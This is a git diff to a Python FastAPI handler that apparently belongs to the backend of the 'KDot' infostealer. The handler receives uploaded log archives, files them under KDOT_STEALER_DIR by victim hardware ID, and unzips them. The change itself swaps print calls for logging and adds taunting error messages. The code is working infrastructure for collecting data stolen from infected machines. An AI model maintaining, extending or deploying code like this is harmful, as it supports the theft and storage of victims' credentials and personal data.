@@ -1,5 +1,6 @@
 import os
 import zipfile
+import logging
 
 from fastapi import File, UploadFile, HTTPException
 
@@ -28,13 +29,13 @@ class LogHandler:
             self.file_date = self.file_name_no_ext.split("_")[3]
             self.file_timezone = self.file_name_no_ext.split("_")[4]
         except Exception as e:
-            print(e)
+            logging.error(f"Error parsing file name: {e}")
             raise HTTPException("KDot227 on github lmfao")
 
         self.HWID_folder_dir = os.path.join(self.KDOT_STEALER_DIR, self.file_hwid)
         self.HWID_path_expected = os.path.join(self.HWID_folder_dir, self.file_name)
 
-        print(self.HWID_folder_dir, self.HWID_path_expected)
+        logging.info(f"LogHandler initialized with file: {self.file_name}")
 
     def read_file(self) -> bytes:
         """Reads the file and returns the contents.
@@ -75,6 +76,8 @@ class LogHandler:
                     zip_ref.extractall(self.HWID_folder_dir)
             os.remove(self.HWID_path_expected)
         except Exception as e:
-            print(e)
+            logging.critical(
+                f"Error unzipping file: {e} YOU ARE MOST LIKELY BEING WATCHED!!!"
+            )
             return False
         return True
